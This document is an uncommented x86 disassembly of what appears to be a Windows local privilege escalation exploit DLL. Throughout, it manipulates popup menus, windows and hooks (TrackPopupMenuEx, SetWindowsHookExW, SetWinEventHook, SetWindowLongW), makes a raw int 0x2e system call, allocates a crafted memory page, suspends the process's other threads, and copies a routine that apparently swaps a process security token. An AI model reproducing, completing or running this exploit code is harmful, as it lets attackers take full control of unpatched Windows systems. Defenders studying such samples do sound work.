sub_10001020
push ebp
mov ebp esp
push ebx
push ecx
push edx
push esi
push edi
push ebp
sub esp 0x100
mov eax [ rw-data ]
mov ecx [ ebp + 0x8 ]
mov ebx ecx
push 0x1
call eax
add esp 0x100
pop ebp
pop edi
pop esi
pop edx
pop ecx
pop ebx
leave
retn 0x4
sub_1000104d
push ebp
mov ebp esp
push ebx
push ecx
push edx
push esi
push edi
push ebp
sub esp 0x100
mov eax [ rw-data ]
mov ecx [ ebp + 0x8 ]
mov edx 0x1
call eax
add esp 0x100
pop ebp
pop edi
pop esi
pop edx
pop ecx
pop ebx
leave
retn 0x4
sub_1000108a
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp eax 0x9f9f
jne r-xdata
mov eax 0x1
mov ax cs
cmp ax 0x1b
je r-xdata
cld
mov ecx [ ebp + 0x8 ]
inc [ ecx + 0x16 ]
pushad
call $+5
pop edx
sub edx 0x443
mov ebx 0x100
lea esi [ edx + 0x18 ]
mov edi [ ebp + 0x10 ]
mov ecx [ ecx + 0x8 ]
mov ebx [ edx + 0xc ]
mov ecx [ ebx + ecx ]
mov ecx [ ecx ]
mov ebx [ edx + 0x10 ]
mov eax [ edx + 0x4 ]
push ecx
lodsd [ esi ]
dec ebx
cmp eax 0x0
je r-xdata
mov edi ecx
pop ecx
mov ecx [ ebx + ecx ]
sub ecx ebx
jmp r-xdata
test ebx ebx
je r-xdata
add eax [ edx + 0x8 ]
cmp [ eax ] edi
jne r-xdata
mov esi ecx
mov eax [ edx + 0x14 ]
add esi eax
add edi eax
lodsd [ esi ]
stosd [ edi ]
and eax 0xfffffff8
add [ eax - 0x18 ] 0x2
popad
mov eax 0x9f9f
jmp r-xdata
mov ecx [ ebx + ecx ]
sub ecx ebx
jmp r-xdata
cmp [ ebx + ecx - 0x4 ] eax
je r-xdata
and [ eax ] 0x0
jmp r-xdata
leave
retn 0x10
cmp [ ebx + ecx - 0x4 ] 0x4
je r-xdata
sub_10001140
push ebp
mov ebp esp
sub esp 0x8
push rw-data
push rw-data
call [ LoadLibraryA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] 0x30
jae r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0x4 ]
movzx edx [ ecx ]
cmp edx 0x2b2
jne r-xdata
mov esp ebp
pop ebp
retn
mov [ rw-data ] 0x1
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x2
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0x4 ]
movzx edx [ ecx ]
cmp edx 0xe8
jne r-xdata
cmp [ ebp - 0x4 ] 0x30
jae r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
add ecx [ eax + 0x1 ]
mov edx [ ebp - 0x4 ]
lea eax [ ecx + edx + 0x5 ]
mov [ rw-data ] eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0x4 ]
movzx eax [ edx ]
cmp eax 0x26a
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x2
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0x4 ]
movzx eax [ edx ]
cmp eax 0xe8
jne r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
add edx [ ecx + 0x1 ]
mov eax [ ebp - 0x4 ]
lea ecx [ edx + eax + 0x5 ]
mov [ rw-data ] ecx
jmp r-xdata
sub_10001240
push ebp
mov ebp esp
sub esp 0x8
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x2
xor eax eax
cmp [ ebp - 0x4 ] 0x0
sete al
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x4 ]
sub edx 0x1
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
shr eax 0x10
mov [ ebp - 0x8 ] eax
jmp r-xdata
movzx ecx [ ebp - 0x8 ]
test ecx ecx
je r-xdata
sub_10001280
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_10001140
xor eax eax
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_10001020
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_1000104d
jmp r-xdata
mov esp ebp
pop ebp
retn 0x4
sub_100012d0
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x6
jne r-xdata
pop ebp
retn 0x1c
cmp [ rw-data ] 0x3
jae r-xdata
mov edx [ rw-data ]
add edx 0x1
mov [ rw-data ] edx
cmp [ rw-data ] 0x3
jae r-xdata
mov eax [ rw-data ]
mov ecx [ ebp + 0x10 ]
mov [ eax * 4 + rw-data ] ecx
push 0x0
push 0x0
push 0x1f3
mov ecx [ ebp + 0x10 ]
push ecx
call [ SendMessageW@IAT ]
push 0x20002
push 0x1
push 0x201
mov eax [ ebp + 0x10 ]
push eax
call [ SendMessageW@IAT ]
jmp r-xdata
sub_10001340
push ebp
mov ebp esp
sub esp 0x10c
cmp [ ebp + 0xc ] 0x82
jne r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call [ DefWindowProcW@IAT ]
mov esp ebp
pop ebp
retn 0x10
mov [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
shr eax 0x1
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x4 ]
cmp edx [ ebp - 0x10c ]
jae r-xdata
cmp [ ebp - 0x10c ] 0x0
je r-xdata
push 0x100
push 0x44
lea eax [ ebp - 0x108 ]
push eax
call memset
add esp 0xc
mov [ ebp - 0x108 ] 0x98208
mov ecx [ rw-data ]
mov [ ebp - 0x104 ] ecx
mov edx [ rw-data ]
mov [ ebp - 0x100 ] edx
mov eax [ rw-data ]
mov [ ebp - 0xfc ] eax
mov ecx [ rw-data ]
sub ecx 0x4
mov [ ebp - 0xf8 ] ecx
mov edx [ rw-data ]
mov [ ebp - 0xf4 ] edx
mov eax [ rw-data ]
mov [ ebp - 0xf0 ] eax
mov ecx [ rw-data ]
mov [ ebp - 0xec ] ecx
mov [ ebp - 0xe8 ] 0xffffffff
mov edx [ rw-data ]
mov [ ebp - 0xe4 ] edx
mov [ ebp - 0xe0 ] 0xffffffff
xor eax eax
mov ecx [ rw-data ]
mov [ ebp + ecx - 0x10a ] ax
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
call sub_1000107b
push 0x0
mov ecx [ rw-data ]
push ecx
push 0x9f9f
mov edx [ rw-data ]
push edx
call [ SendMessageW@IAT ]
xor ecx ecx
cmp eax 0x9f9f
sete cl
mov [ rw-data ] ecx
cmp [ rw-data ] 0x0
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
sub edx 0x1
mov [ rw-data ] edx
lea eax [ ebp - 0x108 ]
push eax
push 0xfffffff8
mov ecx [ rw-data ]
mov edx [ ecx * 4 + rw-data ]
push edx
call [ SetClassLongW@IAT ]
push 0x0
push 0x0
push 0xabcd
mov edx [ rw-data ]
push edx
call [ PostMessageW@IAT ]
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
sub_10001500
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx [ ebp + 0x14 ]
push ecx
mov edx [ ebp + 0x10 ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call [ DefWindowProcW@IAT ]
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0xc ] 0xabcd
jne r-xdata
cmp [ rw-data ] 0xa
ja r-xdata
mov [ ebp - 0x4 ] 0x0
mov eax [ rw-data ]
add eax 0x1
mov [ rw-data ] eax
call [ EndMenu@IAT ]
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
jae r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
push 0x0
mov edx [ rw-data ]
push edx
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
call [ TrackPopupMenuEx@IAT ]
mov edx [ ebp - 0x4 ]
mov eax [ edx * 4 + rw-data ]
push eax
call [ DestroyWindow@IAT ]
mov ecx [ ebp - 0x4 ]
mov [ ecx * 4 + rw-data ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
sub_100015e0
push ebp
mov ebp esp
movzx eax [ rw-data ]
test eax eax
jne r-xdata
movzx ecx [ rw-data ]
imul ecx ecx 0x343fd
add ecx 0x269ec3
mov [ rw-data ] cx
mov ax [ rw-data ]
pop ebp
retn
rdtsc
mov [ rw-data ] ax
sub_10001620
push ebp
mov ebp esp
sub esp 0x8
mov eax [ rw-data ]
push eax
call [ GetModuleHandleW@IAT ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
add edx [ ecx + 0x3c ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x8 ]
movzx ecx [ eax + 0x40 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] ecx
mov eax [ ebp - 0x8 ]
movzx ecx [ eax + 0x42 ]
mov edx [ ebp + 0xc ]
mov [ edx ] ecx
mov eax 0x1
jmp r-xdata
mov esp ebp
pop ebp
retn 0x8
sub_10001670
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
jne r-xdata
mov edx [ ebp + 0x10 ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
push 0x0
call [ CallNextHookEx@IAT ]
mov esp ebp
pop ebp
retn 0xc
cmp [ rw-data ] 0x1
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x8 ] 0x81
jne r-xdata
push 0x14
lea edx [ ebp - 0x2c ]
push edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0xc ]
push ecx
call [ GetClassNameW@IAT ]
mov edx [ rw-data ]
push edx
lea eax [ ebp - 0x2c ]
push eax
call wcscmp
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ rw-data ]
push ecx
lea edx [ ebp - 0x2c ]
push edx
call wcscmp
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ rw-data ]
add ecx 0x1
mov [ rw-data ] ecx
cmp [ rw-data ] 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0xc ]
mov [ rw-data ] ecx
cmp [ rw-data ] 0x3
jae r-xdata
mov edx [ rw-data ]
push edx
call sub_10001280
mov ecx [ rw-data ]
mov edx [ eax + ecx ]
mov [ rw-data ] edx
push sub_10001340
push 0xfffffffc
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0xc ]
push ecx
call [ SetWindowLongW@IAT ]
jmp r-xdata
jmp r-xdata
push 0x87
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov edx [ rw-data ]
push edx
call [ SetWindowPos@IAT ]
push 0x47
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
call [ SetWindowPos@IAT ]
sub_100017a0
push ebp
mov ebp esp
sub esp 0xc8
push esi
mov [ ebp - 0x44 ] 0x0
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x44 ] 0x0
jmp r-xdata
mov [ ebp - 0x44 ] 0x0
jmp r-xdata
cmp [ ebp - 0x44 ] 0x100
jae r-xdata
cmp [ ebp - 0x44 ] 0x3
jae r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x94 ] 0x0
mov [ ebp - 0x94 ] 0x0
jmp r-xdata
mov [ ebp - 0x44 ] 0x0
jmp r-xdata
mov [ ebp - 0x90 ] 0x0
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x88 ] ecx
mov [ ebp - 0x84 ] ecx
mov [ ebp - 0x80 ] ecx
mov [ ebp - 0x7c ] ecx
mov [ ebp - 0x78 ] ecx
call [ CreatePopupMenu@IAT ]
mov edx [ ebp - 0x44 ]
mov [ edx * 4 + rw-data ] eax
mov [ ebp - 0x90 ] 0x1c
mov [ ebp - 0x8c ] 0x10
mov [ ebp - 0x88 ] 0x70000000
lea eax [ ebp - 0x90 ]
push eax
mov ecx [ ebp - 0x44 ]
mov edx [ ecx * 4 + rw-data ]
push edx
call [ SetMenuInfo@IAT ]
jmp r-xdata
lea edx [ ebp - 0xa8 ]
push edx
push 0x20
push 0x1000
mov eax [ rw-data ]
push eax
call [ VirtualProtect@IAT ]
mov [ ebp - 0x74 ] 0x30
mov [ ebp - 0x70 ] 0x0
mov [ ebp - 0x6c ] sub_10001500
mov [ ebp - 0x68 ] 0x0
mov [ ebp - 0x64 ] 0x0
mov ecx [ rw-data ]
mov [ ebp - 0x60 ] ecx
mov [ ebp - 0x5c ] 0x0
mov [ ebp - 0x58 ] 0x0
mov [ ebp - 0x54 ] 0x0
mov [ ebp - 0x50 ] 0x0
mov edx [ rw-data ]
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x48 ] 0x0
lea eax [ ebp - 0x74 ]
push eax
call [ RegisterClassExW@IAT ]
movzx ecx ax
test ecx ecx
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x94 ] 0x20
jae r-xdata
cmp [ ebp - 0x44 ] 0x3
jae r-xdata
mov eax [ ebp - 0x44 ]
add eax 0x1
mov [ ebp - 0x44 ] eax
xor eax eax
push 0x0
mov edx [ rw-data ]
push edx
push 0x0
push 0x0
push 0x1
push 0x1
push 0x0
push 0x0
push __dos_header
push 0x0
mov eax [ rw-data ]
push eax
push 0x80088
call [ CreateWindowExW@IAT ]
mov [ rw-data ] eax
push 0x0
mov ecx [ rw-data ]
push ecx
push 0x0
push 0x0
push 0x1
push 0x1
push 0x0
push 0x0
push 0x0
push 0x0
mov edx [ rw-data ]
push edx
push 0x0
call [ CreateWindowExW@IAT ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn 0x4
xor ecx ecx
mov [ ebp - 0x2 ] cx
mov [ ebp - 0x74 ] 0x30
mov [ ebp - 0x70 ] 0x0
mov edx [ DefWindowProcW@IAT ]
mov [ ebp - 0x6c ] edx
mov [ ebp - 0x68 ] 0x0
mov [ ebp - 0x64 ] 0x200
mov eax [ rw-data ]
mov [ ebp - 0x60 ] eax
mov [ ebp - 0x5c ] 0x0
mov [ ebp - 0x58 ] 0x0
mov [ ebp - 0x54 ] 0x0
mov [ ebp - 0x50 ] 0x0
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x48 ] 0x0
lea edx [ ebp - 0x74 ]
push edx
call [ RegisterClassExW@IAT ]
movzx eax ax
test eax eax
je r-xdata
call sub_100015e0
movzx eax ax
cdq
mov ecx 0x19
idiv ecx
add edx 0x41
mov eax [ ebp - 0x94 ]
mov [ ebp + eax * 2 - 0x40 ] dx
jmp r-xdata
cmp [ ebp - 0x44 ] 0x2
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
push eax
call sub_10001280
mov ecx [ eax + 0x10 ]
add ecx [ rw-data ]
mov [ rw-data ] ecx
mov edx [ rw-data ]
add edx 0x418
push edx
push 0xfffffffc
mov eax [ rw-data ]
push eax
call [ SetWindowLongW@IAT ]
jmp r-xdata
jmp r-xdata
push 0x0
mov ecx [ rw-data ]
push ecx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea edx [ ebp - 0x40 ]
push edx
push 0x0
call [ CreateWindowExW@IAT ]
mov [ ebp - 0x98 ] eax
cmp [ ebp - 0x98 ] 0x0
je r-xdata
mov ecx [ ebp - 0x94 ]
add ecx 0x1
mov [ ebp - 0x94 ] ecx
mov [ ebp - 0xc8 ] 0x0
mov ecx [ ebp - 0x44 ]
mov edx [ ecx * 4 + rw-data ]
mov [ ebp - 0xc8 ] edx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x44 ]
add eax 0x1
mov [ ebp - 0x44 ] eax
mov eax [ rw-data ]
mov ecx [ ebp - 0x98 ]
mov [ eax * 4 + rw-data ] ecx
mov edx [ rw-data ]
mov eax [ edx * 4 + rw-data ]
push eax
call sub_10001280
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov esi [ rw-data ]
mov eax [ eax + esi ]
mov [ edx + ecx * 4 + 0x18 ] eax
mov ecx [ rw-data ]
add ecx 0x1
mov [ rw-data ] ecx
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
add eax 0x1
mov [ ebp - 0x44 ] eax
push rw-data
mov eax [ ebp - 0xc8 ]
push eax
push 0x410
mov ecx [ ebp - 0x44 ]
mov edx [ ecx * 4 + rw-data ]
push edx
call [ AppendMenuA@IAT ]
jmp r-xdata
call [ GetCurrentThreadId@IAT ]
push eax
mov ecx [ rw-data ]
push ecx
push sub_10001670
push 0x4
call [ SetWindowsHookExW@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x98 ]
push edx
call sub_10001280
mov [ ebp - 0xa0 ] eax
mov eax [ ebp - 0xa0 ]
mov ecx [ eax + 0x10 ]
mov [ ebp - 0x9c ] ecx
mov edx [ rw-data ]
mov eax [ ebp - 0x9c ]
lea ecx [ eax + edx + 0x4 ]
mov [ ebp - 0x9c ] ecx
cmp [ rw-data ] 0x4
jb r-xdata
push 0x0
call [ GetCurrentThreadId@IAT ]
push eax
call [ GetCurrentProcessId@IAT ]
push eax
push sub_100012d0
mov edx [ rw-data ]
push edx
push 0x7fffffff
push 0x1
call [ SetWinEventHook@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0xa4 ] 0x0
mov [ ebp - 0xa4 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x9c ]
add edx 0x44
and edx 0x8000
jne r-xdata
push 0x0
push 0x0
push 0xabcd
mov eax [ rw-data ]
push eax
call [ PostMessageW@IAT ]
cmp [ ebp - 0x44 ] 0x7f
jae r-xdata
mov eax [ ebp - 0x9c ]
add eax 0x44
push eax
call sub_10001240
test eax eax
je r-xdata
lea edx [ ebp - 0xc4 ]
push edx
call [ TranslateMessage@IAT ]
lea eax [ ebp - 0xc4 ]
push eax
call [ DispatchMessageW@IAT ]
jmp r-xdata
push 0x0
push 0x28
mov eax [ ebp - 0x98 ]
push eax
call [ SetWindowLongW@IAT ]
push 0x0
push 0x6c
mov ecx [ ebp - 0x98 ]
push ecx
call [ SetWindowLongW@IAT ]
push 0xc033c033
push 0x1f8
mov edx [ ebp - 0x98 ]
push edx
call [ SetWindowLongW@IAT ]
push 0xffffffff
push 0x1fc
mov eax [ ebp - 0x98 ]
push eax
call [ SetWindowLongW@IAT ]
mov ecx [ ebp - 0x9c ]
add ecx 0x44
mov [ rw-data ] ecx
mov edx [ ebp - 0x9c ]
push edx
mov eax [ ebp - 0x44 ]
lea ecx [ eax * 4 + 0x4 ]
push ecx
mov edx [ ebp - 0x98 ]
push edx
call [ SetWindowLongW@IAT ]
jmp r-xdata
push 0x0
push 0x0
push 0x0
lea ecx [ ebp - 0xc4 ]
push ecx
call [ GetMessageW@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x44 ]
add ecx 0x1
mov [ ebp - 0x44 ] ecx
sub_10001d10
push ebp
mov ebp esp
sub esp 0x24
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x18 ] 0x1
push 0xc8
call [ Sleep@IAT ]
push rw-data
call [ LoadLibraryA@IAT ]
test eax eax
jne r-xdata
push 0x490
push 0x0
push rw-data
call memset
add esp 0xc
push 0x0
call [ GetModuleHandleA@IAT ]
mov [ rw-data ] eax
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x8 ]
push ecx
call sub_10001620
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov ecx [ rw-data ]
mov edx [ ecx * 4 + rw-data ]
mov [ rw-data ] edx
cmp [ rw-data ] 0x4
jne r-xdata
cmp [ ebp - 0x8 ] 0x6
jne r-xdata
mov esp ebp
pop ebp
retn 0x4
mov ecx [ rw-data ]
sub ecx 0x1
mov [ ebp - 0x24 ] ecx
mov eax [ rw-data ]
add eax 0x1
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x6
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x1025
call [ SystemParametersInfoW@IAT ]
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x24 ]
mov [ rw-data ] edx
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x6
jne r-xdata
cmp [ ebp - 0x4 ] 0x1
jne r-xdata
mov [ rw-data ] 0x0
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
push 0x40
push 0x3000
push 0x1000
push 0x0
call [ VirtualAlloc@IAT ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x2
jne r-xdata
mov [ rw-data ] 0x2
jmp r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x64
mov [ rw-data ] 0x50
mov [ rw-data ] 0x16
lea edx [ ebp - 0xc ]
push edx
call [ GetCurrentProcess@IAT ]
push eax
call [ IsWow64Process@IAT ]
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x0
push sub_100017a0
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x10 ]
and edx 0xc0000000
shr edx 0x1e
shl edx 0x15
mov eax [ ebp - 0x10 ]
and eax 0x3fe00000
shr eax 0x15
shl eax 0xc
lea ecx [ edx + eax - 0x40000000 ]
mov edx [ ebp - 0x10 ]
and edx 0x1ff000
shr edx 0xc
lea eax [ ecx + edx * 8 ]
mov [ ebp - 0x1c ] eax
mov ecx [ ebp - 0x1c ]
push ecx
call sub_10001240
test eax eax
je r-xdata
mov [ rw-data ] 0x4
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx 0x1
test edx edx
je r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x10 ]
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
mov [ rw-data ] eax
mov ecx [ ebp - 0x10 ]
mov [ rw-data ] ecx
mov edx [ ebp - 0x1c ]
mov [ rw-data ] edx
push 0x1000
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call memset
add esp 0xc
mov ecx [ ebp - 0x20 ]
mov edx [ rw-data ]
mov [ ecx ] edx
mov eax [ ebp - 0x20 ]
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
mov edx [ ebp - 0x20 ]
mov eax [ rw-data ]
mov [ edx + 0x8 ] eax
mov ecx [ ebp - 0x20 ]
mov edx [ rw-data ]
mov [ ecx + 0xc ] edx
mov eax [ ebp - 0x20 ]
mov ecx [ rw-data ]
mov [ eax + 0x10 ] ecx
mov edx [ ebp - 0x20 ]
mov eax [ rw-data ]
mov [ edx + 0x14 ] eax
push 0x100
push sub_1000108a
mov ecx [ rw-data ]
add ecx 0x418
push ecx
call memcpy
add esp 0xc
jmp r-xdata
mov eax [ rw-data ]
mov ecx [ eax * 4 + rw-data ]
mov [ rw-data ] ecx
mov edx [ rw-data ]
mov eax [ edx * 4 + rw-data ]
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov edx [ ecx * 4 + rw-data ]
mov [ rw-data ] edx
mov eax [ rw-data ]
mov ecx [ eax * 4 + rw-data ]
mov [ rw-data ] ecx
mov edx [ rw-data ]
mov eax [ edx * 4 + rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0x0
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
push eax
call [ DestroyWindow@IAT ]
push 0x0
mov ecx [ rw-data ]
push ecx
call [ TerminateThread@IAT ]
jmp r-xdata
cmp [ rw-data ] 0xa
jbe r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
push 0x1f4
call [ Sleep@IAT ]
jmp r-xdata
sub_100020a0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp + 0xc ]
jae r-xdata
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 ]
push ecx
call [ ResumeThread@IAT ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 ]
push ecx
call [ CloseHandle@IAT ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
sub_100020f0
push ebp
mov ebp esp
sub esp 0x2c
call [ GetCurrentProcessId@IAT ]
mov [ ebp - 0xc ] eax
call [ GetCurrentThreadId@IAT ]
mov [ ebp - 0x4 ] eax
push 0x0
push 0x4
call CreateToolhelp32Snapshot
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ eax ] 0x0
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
mov esp ebp
pop ebp
retn 0x8
mov [ ebp - 0x28 ] 0x1c
lea ecx [ ebp - 0x28 ]
push ecx
mov edx [ ebp - 0x8 ]
push edx
call Thread32First
test eax eax
je r-xdata
mov edx [ ebp - 0x8 ]
push edx
call [ CloseHandle@IAT ]
cmp [ ebp - 0x28 ] 0x10
jb r-xdata
mov [ ebp - 0x28 ] 0x1c
lea edx [ ebp - 0x28 ]
push edx
mov eax [ ebp - 0x8 ]
push eax
call Thread32Next
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov ecx [ ebp + 0xc ]
cmp [ ecx ] 0x1000
jb r-xdata
mov ecx [ ebp - 0x1c ]
cmp ecx [ ebp - 0xc ]
jne r-xdata
mov edx [ ebp - 0x20 ]
push edx
push 0x0
push 0x1f03ff
call [ OpenThread@IAT ]
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x2c ] 0x0
je r-xdata
mov eax [ ebp - 0x2c ]
push eax
call [ SuspendThread@IAT ]
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x2c ]
mov [ eax + edx * 4 ] ecx
mov edx [ ebp + 0xc ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
EP
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x4 ] 0x0
push 0x4
push 0x3000
push 0x4000
push 0x0
call [ VirtualAlloc@IAT ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
mov [ ebp - 0xc ] 0x0
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
push ecx
call sub_100020f0
call [ GetCurrentProcessId@IAT ]
push eax
call sub_10001d10
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0xc ]
push edx
mov eax [ ebp - 0x8 ]
push eax
call sub_100020a0
Thread32First
jmp [ Thread32First@IAT ]
Thread32Next
jmp [ Thread32Next@IAT ]
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
memcpy
jmp [ memcpy@IAT ]
sub_1000107b
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
int 0x2e
leave
retn 0xc
sub_10002090
push ebp
mov ebp esp
push 0x0
call [ ExitProcess@IAT ]
_start
push ebp
mov ebp esp
call EP
mov eax 0x1
pop ebp
retn 0xc
